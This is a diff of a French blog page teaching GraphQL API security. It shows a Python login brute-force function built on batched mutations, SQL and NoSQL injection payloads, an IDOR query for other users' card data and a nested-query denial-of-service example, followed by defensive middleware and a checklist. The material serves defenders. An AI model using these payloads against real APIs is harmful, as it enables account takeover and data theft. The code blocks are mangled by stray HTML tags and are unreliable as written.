@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Sécurité des APIs GraphQL : vulnérabilités et protections — Temgus.CyberBlog</title>
 <meta name="description" content="Introspection, batching attacks, injection GraphQL, IDOR et protections : depth limiting, rate limiting, autorisation.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-api-graphql.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/securite-api-graphql.html">
 <meta property="og:title" content="Sécurité des APIs GraphQL : vulnérabilités et protections — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Sécurité des APIs GraphQL : vulnérabilités et protections — Temgus.CyberBlog">
 <meta name="twitter:description" content="Introspection, batching attacks, injection GraphQL, IDOR et protections : depth limiting, rate limiting, autorisation.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,508 @@
   "headline": "Sécurité des APIs GraphQL : vulnérabilités et protections",
   "description": "Introspection, batching attacks, injection GraphQL, IDOR et protections : depth limiting, rate limiting, autorisation.",
   "datePublished": "2025-09-06",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/securite-api-graphql.html",
   "inLanguage": "fr",
   "keywords": "GraphQL, API, introspection, batching, injection",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">⬡</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Sécurité des APIs GraphQL : vulnérabilités et protections</h1>
-  <p style="color:#8892a4;max-width:500px">Introspection, batching attacks, injection GraphQL, IDOR et protections : depth limiting, rate limiting, autorisation.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-api-graphql" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">⬡</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Sécurité des APIs GraphQL : vulnérabilités et protections</div>
+      <div class="meta-details">
+        <span>📅 2025-09-06</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#graphql-vs-rest-diff-rences-de-s-curit-">GraphQL vs REST : différences de sécurité</a></li>
+<li><a href="#introspection-cartographier-l-api">Introspection — Cartographier l'API</a></li>
+<li><a href="#batching-attacks-brute-force-via-graphql">Batching Attacks — Brute Force via GraphQL</a></li>
+<li><a href="#injection-dans-les-arguments-graphql">Injection dans les arguments GraphQL</a></li>
+<li><a href="#idor-dans-graphql">IDOR dans GraphQL</a></li>
+<li><a href="#d-ni-de-service-par-requ-tes-imbriqu-es">Déni de service par requêtes imbriquées</a></li>
+<li><a href="#protections-graphql">Protections GraphQL</a></li>
+<li><a href="#checklist-s-curit-graphql">Checklist sécurité GraphQL</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Sécurité des APIs GraphQL : vulnérabilités et protections</h1>
+
+<p>GraphQL offre une flexibilité remarquable aux développeurs, mais cette même flexibilité crée des vecteurs d'attaque uniques. Ce guide couvre les vulnérabilités spécifiques à GraphQL et comment les corriger.</p>
+
+<h2 id="graphql-vs-rest-diff-rences-de-s-curit-">GraphQL vs REST : différences de sécurité</h2>
+
+<pre><code>REST :
+<p>GET /users/123          → Données d'un utilisateur</p>
+<p>GET /users             → Liste des utilisateurs</p>
+<p>POST /users            → Créer un utilisateur</p>
+<p>→ Endpoints fixes, facile à sécuriser</p>
+
+<p>GraphQL :</p>
+<p>POST /graphql avec query personnalisée</p>
+<p>→ Un seul endpoint</p>
+<p>→ Le client choisit exactement ce qu'il veut</p>
+<p>→ Surface d'attaque plus complexe</code></pre>
+
+<h2 id="introspection-cartographier-l-api">Introspection — Cartographier l'API</h2>
+
+<pre><code class="language-graphql"># L'introspection révèle toute la structure de l'API
+<h1>Souvent activée en production !</h1>
+
+<p>{</p>
+<p>__schema {</p>
+<p>types {</p>
+<p>name</p>
+<p>kind</p>
+<p>fields {</p>
+<p>name</p>
+<p>type {</p>
+<p>name</p>
+<p>kind</p>
+<p>}</p>
+<p>args {</p>
+<p>name</p>
+<p>type {</p>
+<p>name</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+
+<h1>Résultat : toutes les types, queries, mutations, subscriptions !</h1>
+<h1>Un attaquant peut découvrir des endpoints cachés non documentés</h1>
+
+<h1>Outil : GraphQL Voyager (visualisation), InQL (Burp extension)</code></pre></h1>
+
+<h2 id="batching-attacks-brute-force-via-graphql">Batching Attacks — Brute Force via GraphQL</h2>
+
+<pre><code class="language-python"># GraphQL permet d'envoyer plusieurs queries en un seul appel
+<h1>→ Contourne le rate limiting basé sur les requêtes</h1>
+
+<h1>Brute force de login via batching</h1>
+<p>import requests, json</p>
+
+<p>def graphql_batch_bruteforce(url, username, passwords):</p>
+<p>queries = []</p>
+<p>for i, password in enumerate(passwords):</p>
+<p>queries.append({</p>
+<p>"query": f"""</p>
+<p>mutation login{i} { {</p>
+<p>login(username: "{username}", password: "{password}") { {</p>
+<p>token</p>
+<p>success</p>
+<p>} }</p>
+<p>} }</p>
+<p>"""</p>
+<p>})</p>
+
+<p># Une seule requête HTTP = des centaines de tentatives</p>
+<p>response = requests.post(url, json=queries)</p>
+<p>results = response.json()</p>
+
+<p>for i, result in enumerate(results):</p>
+<p>if result.get('data', {}).get(f'login{i}', {}).get('success'):</p>
+<p>return passwords[i]  # Mot de passe trouvé !</p>
+
+<p>return None</code></pre>
+
+<h2 id="injection-dans-les-arguments-graphql">Injection dans les arguments GraphQL</h2>
+
+<pre><code class="language-graphql"># GraphQL Injection - si les arguments ne sont pas validés
+
+<h1>Injection dans un champ de recherche</h1>
+<p>{</p>
+<p>searchUsers(name: "admin\" OR \"1\"=\"1") {</p>
+<p>id</p>
+<p>email</p>
+<p>password</p>
+<p>}</p>
+<p>}</p>
+
+<h1>NoSQL Injection dans les arguments (MongoDB backend)</h1>
+<p>{</p>
+<p>user(id: {$gt: ""}) {</p>
+<p>id</p>
+<p>username</p>
+<p>password</p>
+<p>}</p>
+<p>}</p>
+<h1>Si mal géré → retourne TOUS les utilisateurs !</code></pre></h1>
+
+<h2 id="idor-dans-graphql">IDOR dans GraphQL</h2>
+
+<pre><code class="language-graphql"># Accéder aux données d'autres utilisateurs
+
+<h1>Requête légitime : voir SON profil</h1>
+<p>{</p>
+<p>user(id: "current_user_id") {</p>
+<p>name</p>
+<p>email</p>
+<p>creditCards {</p>
+<p>number</p>
+<p>cvv</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+
+<h1>IDOR : voir le profil d'un autre utilisateur</h1>
+<p>{</p>
+<p>user(id: "another_user_id") {</p>
+<p>name</p>
+<p>email</p>
+<p>creditCards {</p>
+<p>number  # Données bancaires d'un autre !</p>
+<p>cvv</p>
+<p>}</p>
+<p>}</p>
+<p>}</code></pre>
+
+<h2 id="d-ni-de-service-par-requ-tes-imbriqu-es">Déni de service par requêtes imbriquées</h2>
+
+<pre><code class="language-graphql"># GraphQL permet des requêtes infiniment imbriquées
+<h1>Sans limite → épuisement des ressources serveur</h1>
+
+<h1>Attaque par profondeur excessive</h1>
+<p>{</p>
+<p>user(id: "1") {</p>
+<p>friends {</p>
+<p>friends {</p>
+<p>friends {</p>
+<p>friends {</p>
+<p>friends {</p>
+<p>friends {</p>
+<p># ... 100 niveaux d'imbrication</p>
+<p>name</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<h1>Génère une requête SQL avec 100 jointures = crash du serveur !</code></pre></h1>
+
+<h2 id="protections-graphql">Protections GraphQL</h2>
+
+<pre><code class="language-python"># 1. Désactiver l'introspection en production
+<p>from graphene import Schema</p>
+
+<p>schema = Schema(query=Query, mutation=Mutation)</p>
+<h1>Dans le middleware :</h1>
+<p>def introspection_middleware(next, root, info, **args):</p>
+<p>if info.field_name.startswith('__'):</p>
+<p>if not info.context.user.is_staff:  # Seulement pour les admins</p>
+<p>raise Exception('Introspection désactivée en production')</p>
+<p>return next(root, info, **args)</p>
+
+<h1>2. Limiter la profondeur des requêtes</h1>
+<p>from graphql_depth_limit import depth_limit_middleware</p>
+
+<p>app = Flask(__name__)</p>
+<p>schema = Schema(query=Query)</p>
+
+<p>@app.route('/graphql', methods=['POST'])</p>
+<p>def graphql_view():</p>
+<p>data = request.json</p>
+<p>result = schema.execute(</p>
+<p>data['query'],</p>
+<p>middleware=[depth_limit_middleware(max_depth=5)]  # Max 5 niveaux</p>
+<p>)</p>
+<p>return jsonify(result.data)</p>
+
+<h1>3. Rate limiting par complexité</h1>
+<h1>Chaque champ a un "coût" calculé</h1>
+<h1>Une requête trop complexe est rejetée</h1>
+
+<h1>4. Validation des inputs</h1>
+<p>import re</p>
+
+<p>def validate_graphql_input(value):</p>
+<p># Rejeter les caractères suspects</p>
+<p>if re.search(r'["\$\{\}]', str(value)):</p>
+<p>raise ValueError(f"Caractères non autorisés dans l'input: {value}")</p>
+<p>return value</p>
+
+<h1>5. Authorization à chaque resolver</h1>
+<p>def resolve_user(root, info, id):</p>
+<p># Vérifier que l'utilisateur connecté peut accéder à cet ID</p>
+<p>current_user = info.context.user</p>
+<p>if str(current_user.id) != str(id) and not current_user.is_admin:</p>
+<p>raise Exception("Non autorisé")</p>
+<p>return User.query.get(id)</code></pre>
+
+<h2 id="checklist-s-curit-graphql">Checklist sécurité GraphQL</h2>
+
+<pre><code>✅ Introspection désactivée en production
+<p>✅ Limitation de la profondeur des requêtes (max 5-10)</p>
+<p>✅ Rate limiting par complexité de requête</p>
+<p>✅ Authorization vérifiée dans CHAQUE resolver</p>
+<p>✅ Validation stricte de tous les inputs</p>
+<p>✅ Pagination obligatoire (pas de "retourner tous les records")</p>
+<p>✅ Journalisation de toutes les requêtes</p>
+<p>✅ Timeout sur les requêtes longues</p>
+<p>✅ CORS correctement configuré</p>
+<p>✅ Pas de données sensibles dans les messages d'erreur</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>GraphQL est un paradigme puissant mais qui nécessite une attention sécurité spécifique. Les attaques par introspection, batching et requêtes imbriquées sont des risques uniques à GraphQL. La défense efficace combine : désactivation de l'introspection en prod, limitation de la complexité, autorisation granulaire et validation stricte des inputs.</p>
+
+<p>---</p>
+<p><em>Catégorie : Pentest</em></p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#securite-api-graphql" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-mobile-avance.html" class="nav-prev">← Sécurité mobile avancée : pentest Android et iOS</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-conteneurs-docker-avance.html" class="nav-next">Sécurité avancée des conteneurs : escapes et hardening →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
